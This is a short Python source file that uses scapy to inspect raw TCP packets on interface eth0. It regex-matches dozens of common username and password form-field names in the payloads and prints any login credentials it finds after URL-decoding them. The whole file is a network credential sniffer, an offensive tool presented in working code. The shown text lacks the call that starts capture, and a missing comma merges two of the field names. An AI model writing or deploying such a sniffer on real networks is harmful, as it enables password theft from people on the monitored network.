from scapy.all import *
from urllib import parse
import re

# #
# #
iface="eth0"
# #
def get_login_pass(body):
    user=None
    passwd= None

    userfields=['log', 'login', 'wpname', 'ahd_usrname', 'unickname', 'nickname', 'user', 'alias', 'pseudo',
                'email', 'username', 'userid', 'form_loginname', 'loginid', 'login_id', 'session_key', 'sessionkey',
                'pop_login', 'uid', 'id', 'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername',
                'login_email' 'uin', 'sign-in', 'usuario']

    passfields=['ahd_password', 'pass', 'password', '_password','passwd', 'pwd', 'login_password', 'loginpassword',
                'form_pw', 'pw', 'userpassword', 'passwort', 'passwrd', 'upasswd', 'senha', 'contrasena']


#
    for login in userfields:
        login_re=re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user=login_re.group()
#
    for passfield in passfields:
        pass_re= re.search('(%s=[^&]+)'% passfield, body, re.IGNORECASE)
        if pass_re:
            passwd=pass_re.group()
#
    if user and passwd:
        return (user, passwd)
#

def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body=str(packet[TCP].payload)
        user_pass=get_login_pass(body)
        if user_pass != None:
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
        pass
# #

